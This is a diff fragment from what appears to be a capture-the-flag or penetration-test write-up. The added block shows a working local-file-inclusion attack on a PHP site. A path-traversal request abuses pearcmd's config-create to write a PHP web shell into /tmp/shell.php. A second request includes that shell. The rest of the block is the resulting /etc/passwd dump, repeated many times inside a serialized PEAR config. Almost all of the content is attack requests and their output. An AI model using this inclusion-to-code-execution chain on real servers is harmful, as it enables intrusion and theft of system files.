@@ -600,3 +600,313 @@ uid=474(wwwrun) gid=477(www) groups=477(www)/pear";s:7:"man_dir";s:91:"/&locale=
 uid=474(wwwrun) gid=477(www) groups=477(www)/pear/man";}
 ```
 
+```
+GET /locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system('cat${IFS}/etc/passwd')?>+/tmp/shell.php HTTP/1.1
+
+then:
+
+GET /locales/locale.json?locale=../../../../../tmp&namespace=shell HTTP/1.1
+
+#PEAR_Config 0.9
+a:13:{s:7:"php_dir";s:109:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+_laurel:x:469:100::/var/log/laurel:/bin/false/pear/php";s:8:"data_dir";s:110:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+_laurel:x:469:100::/var/log/laurel:/bin/false/pear/data";s:7:"www_dir";s:109:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+_laurel:x:469:100::/var/log/laurel:/bin/false/pear/www";s:7:"cfg_dir";s:109:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+_laurel:x:469:100::/var/log/laurel:/bin/false/pear/cfg";s:7:"ext_dir";s:109:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+_laurel:x:469:100::/var/log/laurel:/bin/false/pear/ext";s:7:"doc_dir";s:110:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+_laurel:x:469:100::/var/log/laurel:/bin/false/pear/docs";s:8:"test_dir";s:111:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+_laurel:x:469:100::/var/log/laurel:/bin/false/pear/tests";s:9:"cache_dir";s:111:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+_laurel:x:469:100::/var/log/laurel:/bin/false/pear/cache";s:12:"download_dir";s:114:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+_laurel:x:469:100::/var/log/laurel:/bin/false/pear/download";s:8:"temp_dir";s:110:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+_laurel:x:469:100::/var/log/laurel:/bin/false/pear/temp";s:7:"bin_dir";s:105:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+_laurel:x:469:100::/var/log/laurel:/bin/false/pear";s:7:"man_dir";s:109:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+_laurel:x:469:100::/var/log/laurel:/bin/false/pear/man";s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}}
+```
